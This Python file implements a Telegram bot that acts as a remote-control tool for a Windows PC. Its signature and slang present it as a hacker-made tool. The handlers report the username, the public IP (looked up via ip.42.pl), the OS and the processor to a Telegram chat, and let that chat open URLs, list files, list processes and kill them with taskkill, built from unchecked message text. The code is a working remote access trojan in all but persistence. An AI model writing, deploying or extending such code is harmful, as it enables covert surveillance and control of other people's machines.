import os 
from dotenv import load_dotenv 
import telebot 
import requests 
import platform 
import webbrowser 
import subprocess 
from telebot import util 
from subprocess import Popen   

load_dotenv() 
token = os.getenv('BOT_TOKEN')
id_chat = os.getenv('TELEGRAM_ID')

bot = telebot.TeleBot(token, threaded=True) 
bot.worker_pool = util.ThreadPool(num_threads=500) 

@bot.message_handler(commands=['start', 'Start']) 
def start_command(command): 
    bot.send_message( 
        id_chat, 'Hiiiiiya Brodi!' + 
        '\n\nlets parTy , if you want my command list write /help' + 
        '\n\nCoded by cucklorde666()  | Those who stand for nothing fall for everything'
    )

@bot.message_handler(commands=['help', 'Help'])
def help(command): 
    bot.send_message( 
        id_chat, 
        'Commands: \n /Info - Information about la_computadora \n /Open_url - Open Website' 
        + 
        '\n /ls - List dir \n /Kill_process - Fuck that process \n /Tasklist - Process List'
        +
        '\n /pwd - list where dey at \n '
    )

@bot.message_handler(commands=['info', 'Info'])
def info_send(command):
    try: 
        username = os.getlogin() 

        r = requests.get('http://ip.42.pl/raw') 
        ip = r.text 
        windows = platform.platform() 
        processor = platform.processor() 

        bot.send_message( 
            id_chat, 'PC: ' + username + '\nIP: ' + ip + '\nOS: ' + windows + 
            '\nProcessor: ' + processor) 
    except: 
        bot.send_message(id_chat, 'Error') 

@bot.message_handler(commands=['open_url']) 
def open_url(message): 
    user_msg = '{0}'.format(message.text) 
    url = user_msg.split(' ')[1] 
    try: 
        webbrowser.open_new_tab(url) 
    except: 
        bot.send_message(id_chat, 'Error blyt') 

@bot.message_handler(commands=['pwd', 'Pwd']) 
def pwd(command): 
    dir = os.path.abspath(os.getcwd())
    bot.send_message(id_chat, 'Pwd: \n' + (str(dir))) 

@bot.message_handler(commands=['ls', 'Ls']) 
def ls_dir(command): 
    try: 
        dirs = '\n'.join(os.listdir(path='.')) 
        bot.send_message(id_chat, 'Files: ' + '\n' + dirs) 
    except: 
        bot.send_message(id_chat, 'Bla') 

@bot.message_handler(commands=['kill_process', 'Kill_process']) 
def kill_process(message):
    try: 
        user_msg = '{0}'.format(message.text) 
        subprocess.call('taskkill /IM ' + user_msg.split(' ')[1]) 
        bot.send_message(id_chat, 'Super!') 
    except: 
        bot.send_message(id_chat, 'SWICK!')

@bot.message_handler(commands=['tasklist', 'Tasklist']) 
def tasklist(command): 
    try: 
        bot.send_chat_action(id_chat, 'typing') 

        prs = Popen('tasklist', 
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.STDOUT, 
                    stdin=subprocess.PIPE).stdout.readlines() 

        pr_list = [ 
            prs[i].decode('cp866', 'ignore').split()[0].split('.exe')[0] 
            for i in range(3, len(prs)) 
        ]

        pr_string = '\n'.join(pr_list) 
        bot.send_message(command.chat.id, 
                        '`' + pr_string + '`', 
                        parse_mode="Markdown") 

    except: 
        bot.send_message(id_chat, '*Not Found_recheck*', parse_mode="Markdown") 


bot.polling() 

